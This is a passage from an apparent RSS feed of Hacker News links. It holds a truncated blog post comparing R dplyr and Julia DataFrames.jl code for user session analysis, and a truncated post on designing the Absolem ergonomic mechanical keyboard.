DataFrames.jl. Therefore neither <code>dplyr</code> nor DataFrames.jl codes were tuned
to be optimal. Rather I have just taken what Andrey proposed in <code>dplyr</code> and
translated it to DataFrames.jl in a way that first came to my mind (but trying
to use piping). However, in the last part of the post I out of curiosity I
decided compare the performance of the codes.</p>

<p>All codes were  tested under R version 4.0.2 and dplyr 1.0.0.
For Julia I used version 1.5.0-rc1.0 and packages: DataFrames.jl 0.21.4,
Pipe.jl 1.3.0, and ShiftedArrays 1.0.0. If you do not have much experience
with setting-up Julia project environments, in <a href="https://bkamins.github.io/julialang/2020/06/28/automatic-project-environments.html">this post</a> I give
a simple recipe how you can do it easily while ensuring you use exactly the same
versions of the packages as I do.</p>



<p>In the first step we load the required packages, create a data frame that
will be used later and sort it by the <code>ts</code> column.</p>

<p>In all examples in this post I first present R code, and then Julia code.
The expected output is shown in a comment. After each step I briefly comment
on the Julia code.</p>

<p><em>dplyr</em></p>

<figure><pre><code data-lang="r"><span>library</span><span>(</span><span>dplyr</span><span>)</span><span>

</span><span>df</span><span> </span><span>&lt;-</span><span> </span><span>data.frame</span><span>(</span><span>ts</span><span> </span><span>=</span><span> </span><span>c</span><span>(</span><span>1</span><span>,</span><span>10</span><span>,</span><span>20</span><span>,</span><span>1000</span><span>,</span><span>1010</span><span>,</span><span>1200</span><span>,</span><span>2200</span><span>,</span><span>2220</span><span>,</span><span>30</span><span>,</span><span>500</span><span>,</span><span>1500</span><span>,</span><span>1600</span><span>),</span><span>
                 </span><span>user_id</span><span> </span><span>=</span><span> </span><span>c</span><span>(</span><span>1</span><span>,</span><span>1</span><span>,</span><span>1</span><span>,</span><span>1</span><span>,</span><span>1</span><span>,</span><span>1</span><span>,</span><span>1</span><span>,</span><span>1</span><span>,</span><span>2</span><span>,</span><span>2</span><span>,</span><span>2</span><span>,</span><span>2</span><span>))</span><span> </span><span>%&gt;%</span><span>
    </span><span>arrange</span><span>(</span><span>ts</span><span>)</span><span>
</span><span>df</span><span>
</span><span>#      ts user_id</span><span>
</span><span># 1     1       1</span><span>
</span><span># 2    10       1</span><span>
</span><span># 3    20       1</span><span>
</span><span># 4    30       2</span><span>
</span><span># 5   500       2</span><span>
</span><span># 6  1000       1</span><span>
</span><span># 7  1010       1</span><span>
</span><span># 8  1200       1</span><span>
</span><span># 9  1500       2</span><span>
</span><span># 10 1600       2</span><span>
</span><span># 11 2200       1</span><span>
</span><span># 12 2220       1</span></code></pre></figure>

<p><em>DataFrames.jl</em></p>

<figure><pre><code data-lang="julia"><span>using</span> <span>DataFrames</span>
<span>using</span> <span>Pipe</span>
<span>using</span> <span>ShiftedArrays</span>
<span>using</span> <span>Statistics</span>

<span>df</span> <span>=</span> <span>@pipe</span> <span>DataFrame!</span><span>(</span><span>ts</span> <span>=</span> <span>[</span><span>1</span><span>,</span><span>10</span><span>,</span><span>20</span><span>,</span><span>1000</span><span>,</span><span>1010</span><span>,</span><span>1200</span><span>,</span><span>2200</span><span>,</span><span>2220</span><span>,</span><span>30</span><span>,</span><span>500</span><span>,</span><span>1500</span><span>,</span><span>1600</span><span>],</span>
                      <span>user_id</span> <span>=</span> <span>[</span><span>1</span><span>,</span><span>1</span><span>,</span><span>1</span><span>,</span><span>1</span><span>,</span><span>1</span><span>,</span><span>1</span><span>,</span><span>1</span><span>,</span><span>1</span><span>,</span><span>2</span><span>,</span><span>2</span><span>,</span><span>2</span><span>,</span><span>2</span><span>])</span> <span>|&gt;</span>
    <span>sort</span><span>(</span><span>_</span><span>,</span> <span>:</span><span>ts</span><span>)</span>
<span># 12×2 DataFrame</span>
<span># │ Row │ ts    │ user_id │</span>
<span># │     │ Int64 │ Int64   │</span>
<span># ├─────┼───────┼─────────┤</span>
<span># │ 1   │ 1     │ 1       │</span>
<span># │ 2   │ 10    │ 1       │</span>
<span># │ 3   │ 20    │ 1       │</span>
<span># │ 4   │ 30    │ 2       │</span>
<span># │ 5   │ 500   │ 2       │</span>
<span># │ 6   │ 1000  │ 1       │</span>
<span># │ 7   │ 1010  │ 1       │</span>
<span># │ 8   │ 1200  │ 1       │</span>
<span># │ 9   │ 1500  │ 2       │</span>
<span># │ 10  │ 1600  │ 2       │</span>
<span># │ 11  │ 2200  │ 1       │</span>
<span># │ 12  │ 2220  │ 1       │</span></code></pre></figure>

<p>In this step I used two things that are worth learning:</p>

<ul>
  <li>A <code>@pipe</code> macro from the Pipes.jl package allows to pass result of the left
hand side of <code>|&gt;</code> to the right hand side in the position where <code>_</code> is placed.
In this case <code>_</code> is a first argument to <code>sort</code>.</li>
  <li>I used <code>DataFrame!</code> constructor; the <code>!</code> in this case means that columns
passed to a freshly constructed data frame <em>are not copied</em> (by default
<code>DataFrame</code> constructor copies passed columns for safety).</li>
</ul>



<p>So the first task is to identify sessions in our data. For each user
a <code>session_id</code> column gives a number of session for this user, starting from
zero. Remember, that we assume that a fresh session starts for some user, if
two consecutive events for this user are separated by at least 900 seconds.</p>

<p><em>dplyr</em></p>

<figure><pre><code data-lang="r"><span>session_df</span><span> </span><span>&lt;-</span><span> </span><span>df</span><span> </span><span>%&gt;%</span><span>
    </span><span>group_by</span><span>(</span><span>user_id</span><span>)</span><span> </span><span>%&gt;%</span><span>
    </span><span>mutate</span><span>(</span><span>prev_ts</span><span> </span><span>=</span><span> </span><span>lag</span><span>(</span><span>ts</span><span>))</span><span> </span><span>%&gt;%</span><span>
    </span><span>mutate</span><span>(</span><span>diff_ts</span><span> </span><span>=</span><span> </span><span>ts</span><span> </span><span>-</span><span> </span><span>prev_ts</span><span>)</span><span> </span><span>%&gt;%</span><span>
    </span><span>mutate</span><span>(</span><span>diff_ts</span><span> </span><span>=</span><span> </span><span>ifelse</span><span>(</span><span>is.na</span><span>(</span><span>diff_ts</span><span>),</span><span> </span><span>0</span><span>,</span><span> </span><span>diff_ts</span><span>))</span><span> </span><span>%&gt;%</span><span>
    </span><span>mutate</span><span>(</span><span>session_start</span><span> </span><span>=</span><span> </span><span>ifelse</span><span>(</span><span>diff_ts</span><span> </span><span>&gt;=</span><span> </span><span>900</span><span>,</span><span> </span><span>1</span><span>,</span><span> </span><span>0</span><span>))</span><span> </span><span>%&gt;%</span><span>
    </span><span>mutate</span><span>(</span><span>session_id</span><span> </span><span>=</span><span> </span><span>cumsum</span><span>(</span><span>session_start</span><span>))</span><span> </span><span>%&gt;%</span><span>
    </span><span>select</span><span>(</span><span>-</span><span>prev_ts</span><span>,</span><span> </span><span>-</span><span>diff_ts</span><span>,</span><span> </span><span>-</span><span>session_start</span><span>)</span><span>
</span><span>session_df</span><span>
</span><span># # A tibble: 12 x 3</span><span>
</span><span># # Groups:   user_id [2]</span><span>
</span><span>#       ts user_id session_id</span><span>
</span><span>#    &lt;dbl&gt;   &lt;dbl&gt;      &lt;dbl&gt;</span><span>
</span><span>#  1     1       1          0</span><span>
</span><span>#  2    10       1          0</span><span>
</span><span>#  3    20       1          0</span><span>
</span><span>#  4    30       2          0</span><span>
</span><span>#  5   500       2          0</span><span>
</span><span>#  6  1000       1          1</span><span>
</span><span>#  7  1010       1          1</span><span>
</span><span>#  8  1200       1          1</span><span>
</span><span>#  9  1500       2          1</span><span>
</span><span># 10  1600       2          1</span><span>
</span><span># 11  2200       1          2</span><span>
</span><span># 12  2220       1          2</span></code></pre></figure>

<p><em>DataFrames.jl</em></p>

<figure><pre><code data-lang="julia"><span>session_df</span> <span>=</span> <span>@pipe</span> <span>df</span> <span>|&gt;</span>
    <span>groupby</span><span>(</span><span>_</span><span>,</span> <span>:</span><span>user_id</span><span>)</span> <span>|&gt;</span>
    <span>combine</span><span>(</span><span>:</span><span>ts</span> <span>=&gt;</span> <span>ts</span> <span>-&gt;</span> <span>begin</span>
        <span>prev_ts</span> <span>=</span> <span>lag</span><span>(</span><span>ts</span><span>)</span>
        <span>diff_ts</span> <span>=</span> <span>ts</span> <span>.-</span> <span>prev_ts</span>
        <span>diff_ts</span> <span>=</span> <span>coalesce</span><span>.</span><span>(</span><span>diff_ts</span><span>,</span> <span>0</span><span>)</span>
        <span>session_start</span> <span>=</span> <span>diff_ts</span> <span>.&gt;</span> <span>900</span>
        <span>session_id</span> <span>=</span> <span>cumsum</span><span>(</span><span>session_start</span><span>)</span>
        <span>return</span> <span>(</span><span>ts</span><span>=</span><span>ts</span><span>,</span> <span>session_id</span><span>=</span><span>session_id</span><span>)</span>
    <span>end</span><span>,</span> <span>_</span><span>,</span> <span>ungroup</span><span>=</span><span>false</span><span>)</span>
<span># GroupedDataFrame with 2 groups based on key: user_id</span>
<span># First Group (8 rows): user_id = 1</span>
<span># │ Row │ user_id │ ts    │ session_id │</span>
<span># │     │ Int64   │ Int64 │ Int64      │</span>
<span># ├─────┼─────────┼───────┼────────────┤</span>
<span># │ 1   │ 1       │ 1     │ 0          │</span>
<span># │ 2   │ 1       │ 10    │ 0          │</span>
<span># │ 3   │ 1       │ 20    │ 0          │</span>
<span># │ 4   │ 1       │ 1000  │ 1          │</span>
<span># │ 5   │ 1       │ 1010  │ 1          │</span>
<span># │ 6   │ 1       │ 1200  │ 1          │</span>
<span># │ 7   │ 1       │ 2200  │ 2          │</span>
<span># │ 8   │ 1       │ 2220  │ 2          │</span>
<span># ⋮</span>
<span># Last Group (4 rows): user_id = 2</span>
<span># │ Row │ user_id │ ts    │ session_id │</span>
<span># │     │ Int64   │ Int64 │ Int64      │</span>
<span># ├─────┼─────────┼───────┼────────────┤</span>
<span># │ 1   │ 2       │ 30    │ 0          │</span>
<span># │ 2   │ 2       │ 500   │ 0          │</span>
<span># │ 3   │ 2       │ 1500  │ 1          │</span>
<span># │ 4   │ 2       │ 1600  │ 1          │</span></code></pre></figure>

<p>Now I could have rewritten the <code>dpyr</code> code to DataFrames.jl in many ways, but
a most natural thing to do it was for me to use the following syntax:</p>
<div><div><pre><code>combine(source_column =&gt; transformation_function, grouped_data_frame)
</code></pre></div></div>
<p>With this approach I can conveniently define an anonymous function
within a <code>begin</code>-<code>end</code> block and return a <code>(ts=ts, session_id=session_id)</code> value
that is a <code>NamedTuple</code> and will get expanded into two columns of a data frame.</p>

<p>I use <code>ungroup=false</code> syntax to keep the result a <code>GroupedDataFrame</code> to match
what we get in <code>dplyr</code>.</p>

<p>Also, in the code of the function I use the <code>lag</code> function from ShiftedArrays.jl.</p>

<p>Now we have all information to answer our business questions.</p>



<p><em>dplyr</em></p>

<figure><pre><code data-lang="r"><span>session_df</span><span> </span><span>%&gt;%</span><span>
    </span><span>summarize</span><span>(</span><span>session_num</span><span> </span><span>=</span><span> </span><span>max</span><span>(</span><span>session_id</span><span>)</span><span> </span><span>+</span><span> </span><span>1</span><span>)</span><span> </span><span>%&gt;%</span><span>
    </span><span>ungroup</span><span>()</span><span> </span><span>%&gt;%</span><span>
    </span><span>summarize</span><span>(</span><span>avg_sessions_per_user</span><span> </span><span>=</span><span> </span><span>sum</span><span>(</span><span>session_num</span><span>)</span><span> </span><span>/</span><span> </span><span>nrow</span><span>(</span><span>.</span><span>))</span><span>
</span><span># # A tibble: 1 x 1</span><span>
</span><span>#   avg_sessions_per_user</span><span>
</span><span>#                   &lt;dbl&gt;</span><span>
</span><span># 1                   2.5</span></code></pre></figure>

<p><em>DataFrames.jl</em></p>

<figure><pre><code data-lang="julia"><span>@pipe</span> <span>session_df</span> <span>|&gt;</span>
    <span>combine</span><span>(</span><span>_</span><span>,</span> <span>:</span><span>session_id</span> <span>=&gt;</span> <span>(</span><span>x</span> <span>-&gt;</span> <span>maximum</span><span>(</span><span>x</span><span>)</span> <span>+</span> <span>1</span><span>)</span> <span>=&gt;</span> <span>:</span><span>session_num</span><span>)</span> <span>|&gt;</span>
    <span>combine</span><span>(</span><span>_</span><span>,</span> <span>:</span><span>session_num</span> <span>=&gt;</span> <span>mean</span> <span>=&gt;</span> <span>:</span><span>avg_sessions_per_user</span><span>)</span>
<span># 1×1 DataFrame</span>
<span># │ Row │ avg_sessions_per_user │</span>
<span># │     │ Float64               │</span>
<span># ├─────┼───────────────────────┤</span>
<span># │ 1   │ 2.5                   │</span></code></pre></figure>

<p>Observe, that in the DataFrames.jl code the first <code>combine</code> is applied
to <code>GroupedDataFrame</code> while the second <code>combine</code> is applied to a <code>DataFrame</code>.</p>



<p><em>dplyr</em></p>

<figure><pre><code data-lang="r"><span>session_df</span><span> </span><span>%&gt;%</span><span>
    </span><span>summarize</span><span>(</span><span>session_num</span><span> </span><span>=</span><span> </span><span>max</span><span>(</span><span>session_id</span><span>)</span><span> </span><span>+</span><span> </span><span>1</span><span>)</span><span> </span><span>%&gt;%</span><span>
    </span><span>filter</span><span>(</span><span>session_num</span><span> </span><span>==</span><span> </span><span>2</span><span>)</span><span> </span><span>%&gt;%</span><span>
    </span><span>summarize</span><span>(</span><span>number_of_two_session_users</span><span> </span><span>=</span><span> </span><span>nrow</span><span>(</span><span>.</span><span>))</span><span>
</span><span># # A tibble: 1 x 1</span><span>
</span><span>#   number_of_two_session_users</span><span>
                        </span><span>&lt;</span><span>int</span><span>&gt;</span><span>
</span><span>1</span><span>                           </span><span>1</span></code></pre></figure>

<p><em>DataFrames.jl</em></p>

<figure><pre><code data-lang="julia"><span>@pipe</span> <span>session_df</span> <span>|&gt;</span>
    <span>combine</span><span>(</span><span>_</span><span>,</span> <span>:</span><span>session_id</span> <span>=&gt;</span> <span>(</span><span>x</span> <span>-&gt;</span> <span>maximum</span><span>(</span><span>x</span><span>)</span> <span>+</span> <span>1</span><span>)</span> <span>=&gt;</span> <span>:</span><span>session_num</span><span>)</span> <span>|&gt;</span>
    <span>filter</span><span>(</span><span>:</span><span>session_num</span> <span>=&gt;</span> <span>==</span><span>(</span><span>2</span><span>),</span> <span>_</span><span>)</span> <span>|&gt;</span>
    <span>DataFrame</span><span>(</span><span>number_of_two_session_users</span> <span>=</span> <span>nrow</span><span>(</span><span>_</span><span>))</span>
<span># 1×1 DataFrame</span>
<span># │ Row │ number_of_two_session_users │</span>
<span># │     │ Int64                       │</span>
<span># ├─────┼─────────────────────────────┤</span>
<span># │ 1   │ 1                           │</span></code></pre></figure>

<p>In this code observe that <code>:session_num =&gt; ==(2)</code> syntax means that in the
<code>filter</code> function we pass each element of <code>:session_num</code> column to <code>==(2)</code>
function, which is a <a href="https://en.wikipedia.org/wiki/Currying">curried</a> version of a standard <code>x == 2</code> comparison.</p>



<p><em>dplyr</em></p>

<figure><pre><code data-lang="r"><span>session_df</span><span> </span><span>%&gt;%</span><span>
    </span><span>summarize</span><span>(</span><span>session_num</span><span> </span><span>=</span><span> </span><span>max</span><span>(</span><span>session_id</span><span>)</span><span> </span><span>+</span><span> </span><span>1</span><span>)</span><span> </span><span>%&gt;%</span><span>
    </span><span>ungroup</span><span>()</span><span> </span><span>%&gt;%</span><span>
    </span><span>arrange</span><span>(</span><span>desc</span><span>(</span><span>session_num</span><span>))</span><span> </span><span>%&gt;%</span><span>
    </span><span>mutate</span><span>(</span><span>rn</span><span> </span><span>=</span><span> </span><span>row_number</span><span>())</span><span> </span><span>%&gt;%</span><span>
    </span><span>filter</span><span>(</span><span>rn</span><span> </span><span>&lt;=</span><span> </span><span>10</span><span>)</span><span> </span><span>%&gt;%</span><span>
    </span><span>select</span><span>(</span><span>-</span><span>rn</span><span>)</span><span>
</span><span># # A tibble: 2 x 2</span><span>
</span><span>#   user_id session_num</span><span>
</span><span>#     &lt;dbl&gt;       &lt;dbl&gt;</span><span>
</span><span># 1       1           3</span><span>
</span><span># 2       2           2</span></code></pre></figure>

<p><em>DataFrames.jl</em></p>

<figure><pre><code data-lang="julia"><span>@pipe</span> <span>session_df</span> <span>|&gt;</span>
    <span>combine</span><span>(</span><span>_</span><span>,</span> <span>:</span><span>session_id</span> <span>=&gt;</span> <span>(</span><span>x</span> <span>-&gt;</span> <span>maximum</span><span>(</span><span>x</span><span>)</span> <span>+</span> <span>1</span><span>)</span> <span>=&gt;</span> <span>:</span><span>session_num</span><span>)</span> <span>|&gt;</span>
    <span>sort</span><span>(</span><span>_</span><span>,</span> <span>:</span><span>session_num</span><span>,</span> <span>rev</span><span>=</span><span>true</span><span>)</span> <span>|&gt;</span>
    <span>first</span><span>(</span><span>_</span><span>,</span> <span>10</span><span>)</span>
<span># 2×2 DataFrame</span>
<span># │ Row │ user_id │ session_num │</span>
<span># │     │ Int64   │ Int64       │</span>
<span># ├─────┼─────────┼─────────────┤</span>
<span># │ 1   │ 1       │ 3           │</span>
<span># │ 2   │ 2       │ 2           │</span></code></pre></figure>

<p>Here note that in the <code>:session_id =&gt; (x -&gt; maximum(x) + 1) =&gt; :session_num</code>
expression we have to wrap <code>x -&gt; maximum(x) + 1</code> in parentheses to get the
correct result (if you would omit it <code>=&gt; :session_num</code> would be treated as a
part of an anonymous function definition).</p>



<p><em>dplyr</em></p>

<figure><pre><code data-lang="r"><span>session_df</span><span> </span><span>%&gt;%</span><span>
    </span><span>arrange</span><span>(</span><span>ts</span><span>)</span><span> </span><span>%&gt;%</span><span>
    </span><span>group_by</span><span>(</span><span>user_id</span><span>,</span><span> </span><span>session_id</span><span>)</span><span> </span><span>%&gt;%</span><span>
    </span><span>mutate</span><span>(</span><span>rn</span><span> </span><span>=</span><span> </span><span>row_number</span><span>())</span><span> </span><span>%&gt;%</span><span>
    </span><span>filter</span><span>(</span><span>rn</span><span> </span><span>==</span><span> </span><span>1</span><span>)</span><span> </span><span>%&gt;%</span><span>
    </span><span>group_by</span><span>(</span><span>user_id</span><span>)</span><span> </span><span>%&gt;%</span><span>
    </span><span>mutate</span><span>(</span><span>prev_start</span><span> </span><span>=</span><span> </span><span>lag</span><span>(</span><span>ts</span><span>))</span><span> </span><span>%&gt;%</span><span>
    </span><span>filter</span><span>(</span><span>!</span><span>is.na</span><span>(</span><span>prev_start</span><span>))</span><span> </span><span>%&gt;%</span><span>
    </span><span>mutate</span><span>(</span><span>sess_diff</span><span> </span><span>=</span><span> </span><span>ts</span><span> </span><span>-</span><span> </span><span>prev_start</span><span>)</span><span> </span><span>%&gt;%</span><span>
    </span><span>ungroup</span><span>()</span><span> </span><span>%&gt;%</span><span>
    </span><span>summarize</span><span>(</span><span>avg_session_starts</span><span> </span><span>=</span><span> </span><span>mean</span><span>(</span><span>sess_diff</span><span>))</span><span>
</span><span># # A tibble: 1 x 1</span><span>
</span><span>#   avg_session_starts</span><span>
</span><span>#                &lt;dbl&gt;</span><span>
</span><span># 1               1223</span></code></pre></figure>

<p><em>DataFrames.jl</em></p>

<figure><pre><code data-lang="julia"><span>@pi…</span></code></pre></figure></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://bkamins.github.io/julialang/2020/07/03/dplyr-vs-df.html">https://bkamins.github.io/julialang/2020/07/03/dplyr-vs-df.html</a></em></p>]]>
            </description>
            <link>https://bkamins.github.io/julialang/2020/07/03/dplyr-vs-df.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-23737449</guid>
            <pubDate>Sun, 05 Jul 2020 08:59:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Absolem Keyboard]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23737163">thread link</a>) | @signa11
<br/>
July 5, 2020 | https://zealot.hu/absolem/ | <a href="https://web.archive.org/web/*/https://zealot.hu/absolem/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <div>

<p><img src="https://zealot.hu/absolem/pics/splash.jpg" alt="Absolem Splash"></p>

<h2 id="tldr">tl;dr</h2>

<p>I’ve designed and built my own mechanical keyboard.
It’s fucking awesome!
I’m going to ramble about it now, <em>in detail</em>.
Read on if you’re interested, or jump to either the <a href="#assembly">in-progress</a> or the <a href="#the-finished-product">finished</a> pictures, or post a comment to <a href="https://www.reddit.com/r/MechanicalKeyboards/comments/d0wls7/ladies_and_gentleman_the_absolem/">the reddit thread</a>, or… you know… do whatever you fancy.
I’m not your mom. :)</p>

<h2 id="contents">Contents</h2>

<ul>
  <li><a href="#intro">Intro</a></li>
  <li><a href="#research">Research</a></li>
  <li><a href="#design">Design</a></li>
  <li><a href="#build">Build</a></li>
  <li><a href="#firmware">Firmware</a></li>
  <li><a href="#keymap">Keymap</a></li>
  <li><a href="#writeup">Writeup</a></li>
  <li><a href="#future-work">Future work</a></li>
  <li><a href="#club">“Club”</a></li>
</ul>

<h2 id="intro">Intro</h2>

<p>Until about one and a half years ago, I’d been happily typing on a <a href="https://www.cnet.com/products/genius-slimstar-i220-keyboard-series/">basic Genius keyboard</a> with a QWERTZ (Hungarian QWERTY) layout.
Ah… simpler times!</p>

<p><img alt="Ignorance is bliss" src="https://zealot.hu/absolem/pics/fun/ignorance_is_bliss.gif">
</p>

<p>I was hovering at about 50-60 wpm, which – while decidedly not blazing fast – didn’t bother me much.
I also didn’t really care that my typing “technique” involved around 4-6 fingers and a lot of looking at the keyboard.
What <em>did</em> bother me was nights when I couldn’t actually see the keys and it slowed me down quite a bit.</p>

<p>If you’re thinking that my solution was learning to touch type, you’re wrong! (for now…)
I, of course, decided that I needed a backlit keyboard.
Around this time I was vaguely aware of mechanical keyboards and the “supposed” superior typing experience they provide.
So to celebrate my dissertation defense, – and after a cursory glance at full size vs. TKL arguments – I treated myself to a <a href="https://www.coolermaster.com/catalog/peripheral/keyboards/masterkeys-pro-s-white/">MasterKeys Pro S</a>.
And that’s where the problems started…</p>

<p>To be fair, the Pro S is a fine keyboard.
But it’s not even the thing that convinced me about mechs.
By the time it arrived, the geekhack-deskthority-r/mk Bermuda triangle sucked me in, and I was already too deep.
Looking back now, I think the main cause was that I started looking at the topic as genuine “research”, and in my mildly fanatic<a href="#footnote-1"><sup>1</sup></a> worldview that could only end with another “dissertation”, which is what this post is, I guess.</p>

<p>So, strap in as I rant about the whole journey that led me here.
Also, fair warning that I’m writing this on the already finished Absolem, which is just a pleasure to type on, so I’m going to be verbose! :P</p>

<h2 id="research">Research</h2>

<p>Being a researcher by trade, I can very much appreciate the need for seeing what someone has already done in order to not reinvent the wheel.
Also, following the old saying “stealing from one source is plagiarism; stealing from many is research”, I have basically patched together the (imho) best parts of what the current state of the art has to offer.
It was an interesting observation to make that almost all the best<a href="#footnote-2"><sup>2</sup></a> ergo aspects came from different places, while their combination didn’t exist yet.
That’s probably what lead to me deciding to design my own; had I found a board that checks all the boxes, I’d have just ordered that.
(I’m also secretly happy that it didn’t turn out like that, because this way I got to make my own, and it was a good chance to grow… but psst, don’t tell that to anyone!)</p>

<p>So with that in mind, let me just quickly walk you through the steps that lead me to “keeb enlightenment”.
Disclaimer, though: I’m only going to mention most concepts briefly to keep the post’s length manageable, but it can hopefully serve as a good starting point to begin your own, deeper research if you want.</p>

<h3 id="general-stuff">General stuff</h3>

<p>Okay, basics first, if you’re interested in the topic, you should browse <a href="https://geekhack.org/">GeekHack</a>, <a href="https://deskthority.net/">Deskthority</a>, and (of course) <a href="https://www.reddit.com/r/MechanicalKeyboards/">r/mk</a>.
(As an example, <a href="https://geekhack.org/index.php?topic=95771.0">here</a> are my tentative first steps in a brave new world over on Geekhack).</p>

<p>These places are not only chock full of information, ideas, and inspiration; they also house a very helpful and supportive community.
This is also where I’d like to thank a few people for their general help in this project, namely:</p>

<ul>
  <li><a href="https://geekhack.org/index.php?action=profile;u=55020">algernon</a>, fellow Hungarian keeb expert, for all the early advice,</li>
  <li><a href="https://feierabendprojekte.wordpress.com/2018/03/21/building-a-keyboard-by-hand/">Azel4231</a>, for his help in switch layout related measurements (I’m the “redditor” from the addendum…),</li>
  <li>and, naturally, <a href="https://www.reddit.com/user/Dotdash32/">DotDash32</a>, for the metric shitton of discussion we’ve done in both posts and reddit messages that really helped me shape what I should aim for.</li>
</ul>

<h3 id="staggers">Staggers</h3>

<p>What became really clear early on is that row-staggers are evil.
The reason they exist is pure path dependence (we’ve always done it like this, let’s keep doing it like this), and they should be eradicated.
For me, this is an issue that’s been a non-issue for a long long time, but now (that I’m “enlightened”) it’s impossible to unsee…
I mean, I sympathize with all the muscle memory that will be lost in a transition (I’m in the middle of one right now, after all), but that can’t be a good enough reason not to switch!
I’m not really a comment-y kind of guy, but you can find even me sometimes in the <a href="https://www.reddit.com/r/MechanicalKeyboards/comments/c8njw4/ergonomic/esr6nab/?context=8&amp;depth=9">middle of an argument</a> under reddit posts that claim some connection to ergonomics, yet still retain the row-stagger.</p>

<p>I’m much more “lenient” towards ortho (a.k.a. grid, or matrix) layouts, but the clear winner of this aspect (for me) is column-staggered boards.
Let’s give future aliens a chance to figure out how we looked like!</p>

<p><img alt="Nerd joke" src="https://zealot.hu/absolem/pics/fun/nerd_joke.jpg" width="60%">
</p>

<p>What’s more, I’m very much in favour of an “aggressive” stagger.
Many boards started in the right direction, but few went far enough, so I’ve been planning to be a little heavier-handed in the stagger department from the start.</p>

<p>As an example, compare a <a href="http://www.vortexgear.tw/vortex2_2.asp?kind=47&amp;kind2=220&amp;kind3=&amp;kind4=997">“traditional” TKL (or 60%)</a> vs. a <a href="https://olkb.com/planck">Planck</a> vs. an <a href="https://atreus.technomancy.us/">Atreus</a>.</p>

<h3 id="the-number-of-keys">The number of keys</h3>

<p>Today’s full size (and beyond) keyboards come from the assumption that there should be the same number of keys as there are desired functionalities and we should make our hands conform to the resulting layout.
I, on the other hand, think that the inverse of this is true, namely that we should make the number of the keys match what’s comfortably reachable from the home position and make the desired functionalities conform to that.</p>

<p><img alt="XKCD keyboard" src="https://zealot.hu/absolem/pics/fun/xkcd_keyboard.png" width="60%">
</p>

<p>This leads to a) touch typing – or at least a strictly enforced finger-key relationship (which has many more benefits I’m not going to discuss here) and b) to the need to significantly decrease the number of keys.
On the other extreme of the spectrum is <a href="http://plover.stenoknight.com/">stenography</a>, but even if we remain firmly within the realm of letter-based typing, we can (and should) make do following the “at most 1 key distance from home” principle.
That leaves at most 6 × 3 keywells + 3 thumb keys per hand.
I’d argue that anything more than that is bad.
(Not only “unnecessary” or “wasteful”, mind you, but actually bad. As in, it could be better with less…)</p>

<p>The natural result of a small number of keys while still wanting a large number of functions is the use of layers.
And layers – especially if combined with custom programmability, more on that later – are the “bees knees”!
Nevertheless, I encounter many posts that criticize the overuse of layers, or posts that express confusion about how a 40% keyboard can still be practical.
I’d refer the former group to their shift keys and the notable lack of dedicated capital letters on their boards, while the latter group should take a look at their phone while writing a text and tell me again how a really small keyboard is unusable.</p>

<p>Anyways, I digress…
The point is that I came to the conclusion that there should be very few keys with heavy layering support.
As an example, consider traditional keyboards vs. a <a href="https://github.com/foostan/crkbd">corne</a>.</p>

<h3 id="the-pinky-column">The pinky column</h3>

<p>Like we saw above, the pinky often gets 2 columns (similarly to the index finger) even when conforming to the “1 distance from home” (1DFH) rule; and much more when not.
What I’ve found is that a) it’s unnecessary with a sufficiently clever keymap and a lo(oooo)t of practice, and b) it <em>should</em> be avoided to spare your weakest fingers however you can.
So I’ve adopted a further restriction over the 1DFH to limit myself to 5 × 3 keys per hand (plus the thumbs, of course).</p>

<p>Regarding the physical layout of the pinky keys, my experiments (and my eyes, when looking at my hand) showed that the pinky can use a little bit of separation from the others.
This <em>could</em> theoretically apply to the ring and middle fingers, too, but I didn’t feel the need in those cases.
However, it really shouldn’t apply for the index finger, which already has an extra column to take care of, like in the case of the <a href="https://github.com/omkbd/Sector">Sector</a>.</p>

<p>As an example of pinky overworking, consider any regular layout (or even the <a href="https://ergodox-ez.com/">Ergodox</a>) vs. the <a href="https://geekhack.org/index.php?topic=89951.0">Minidox</a> (of which my design is basically a slightly refined, glued together, and wireless-ized version).
As for an illustration of the pinky angle, take a look at the <a href="https://github.com/pseudoku/ErgoWarp">ErgoWarp</a>.</p>

<h3 id="the-thumb-region">The thumb region</h3>

<p>Generally, there are three approaches for the thumbs:</p>

<ol>
  <li>SPACEBAR!!! – one of the thumbs can keep hacking away on a button that takes up 6-7 spaces, while the other just exists. Very efficient… <code>&lt;/sarcasm&gt;</code> There are more sophisticated layouts, with split spacebars and the like, but from an ergonomic standpoint, these are all subpar compared to the next two.</li>
  <li>Clusters – consider the <a href="https://ergodox-ez.com/">Ergodox</a> again. While this way is definitely better than a single spacebar, in my opinion it overcompensates with the amount of work it tries to give to the thumbs. The side effect of this is that very few of those thumb keys are actually convenient (or usable, according to some). This leads us nicely to:</li>
  <li>Fans – consider the <a href="https://shop.keyboard.io/">KeyboardIO Model 01</a>. This approach appreciates that the thumb actually moves in an arc, and doesn’t try to add extra functionality either above or below it.</li>
</ol>

<p><img alt="Thumb fractal" src="https://zealot.hu/absolem/pics/fun/thumb_fractal.jpg" width="40%">
</p>

<p>This is probably the only “really” original part of the Absolem design, as all the other stuff I’ve mentioned so far could be seen <em>somewhere</em> before.
And, depending on how we interpret “original”, maybe not even this…
But: I actually placed the thumb keys on an arc, with a measured thumb radius.
Yes, I actually had to refresh my trigonometry for this!
And I, of course, followed the 1DFH principle, too, so there can only be 3 (unlike the KeyboardIO’s 4).</p>

<p>I’d also like to mention, as someone with quite wide (read: fat) thumbs, I’ve aimed to have 1.25u thumb keys from the start, at least for the home position.
The sides can more easily be 1u because they don’t have a neighbor on one side, so there’s less chance for misclicking (mispressing?).
But the thumb home position (which is flanked by other thumb keys on both …</p></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://zealot.hu/absolem/">https://zealot.hu/absolem/</a></em></p>]]>
            </description>
            <link>https://zealot.hu/absolem/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23737163</guid>
            <pubDate>Sun, 05 Jul 2020 07:34:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[I interviewed 200 CTOs from growing startups – here's what came up]]>
            </title>
            <description>
<![CDATA[
